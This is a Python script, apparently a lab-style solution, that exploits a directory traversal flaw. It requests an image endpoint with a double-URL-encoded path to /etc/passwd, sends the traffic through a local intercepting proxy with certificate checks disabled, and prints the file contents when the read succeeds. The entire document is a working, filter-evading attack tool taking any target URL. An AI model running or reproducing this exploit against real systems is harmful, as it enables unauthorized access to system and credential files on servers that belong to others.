import requests
import sys
import urllib3
import urllib.parse

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxies = {"http": "http://127.0.0.1:8087", "https": "http://127.0.0.1:8087"}

def directory_traversal(session, url):
    original_string = "../../../../etc/passwd"
    # try:
    #     # Single URL-encode of the input string
    #     url_encode = urllib.parse.quote(original_string)
    #     print(url_encode)
    #     encode = urllib.parse.quote(url_encode)
    #     print("\n"+encode)
    # except UnicodeError:
    #     print("(-) Error: URL encoding failed due to invalid characters.")
    #     sys.exit(-1)
    url_encode = """%25%32%65%25%32%65%25%32%66%25%32%65%25%32%65%25%32%66%25%32%65%25%32%65%25%32%66%25%32%65%25%32%65%25%32%66%25%36%35%25%37%34%25%36%33%25%32%66%25%37%30%25%36%31%25%37%33%25%37%33%25%37%37%25%36%34"""
    img_url = url + "/image?filename=" + url_encode
    res = session.get(img_url, proxies=proxies, verify=False)

    if 'root:x' in res.text:
        print("(+) The directory traversal exploitation succeeded")
        print(res.text)
    else:
        print("(-) The directory traversal exploit failed")

if __name__ == "__main__":
    try:
        url = sys.argv[1].strip()
    except IndexError:
        print("(+) Usage: %s <url>" % sys.argv[0])
        print("(+) Example: %s www.example.com" % sys.argv[0])
        sys.exit(-1)

    session = requests.Session()
    directory_traversal(session, url)
